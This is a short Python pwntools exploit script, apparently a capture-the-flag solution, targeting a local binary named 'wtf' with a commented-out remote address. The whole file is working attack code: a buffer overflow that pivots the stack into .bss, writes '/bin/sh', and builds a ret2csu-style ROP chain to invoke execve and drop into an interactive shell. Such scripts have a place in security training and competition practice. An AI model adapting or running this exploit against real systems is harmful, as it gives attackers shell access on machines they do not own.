from pwn import *

p = process('./wtf')
#p = remote('34.64.159.111',12775)
e = ELF('./wtf')

payload = 'A' * 0x10 + p64(e.bss()+0x200) + p64(0x40062D)
p.sendline(payload)
sleep(0.3)

payload = '/bin/sh\x00' + '\x00'*0x8 + p64(e.got['memset']+0x10) + p64(0x40062d)
p.sendline(payload)
sleep(0.3)

sh = 0x601230
#rbx rbp r12 r13 r14 r15 #0x4006aa
#rdx=r15, rsi=r14, edi=r13 call [r12+rbx*8] #0x400690
payload = p64(0x400690) + p64(0x4005Eb) + p64(59+0x10)
payload+= p64(0x4006AA) + p64(0x0) + p64(59+0x10)
payload+= p64(e.got['read']) + p64(sh) + p64(0x0) + p64(0x0)
payload+= p64(0x400617)
p.sendline(payload)

p.interactive()
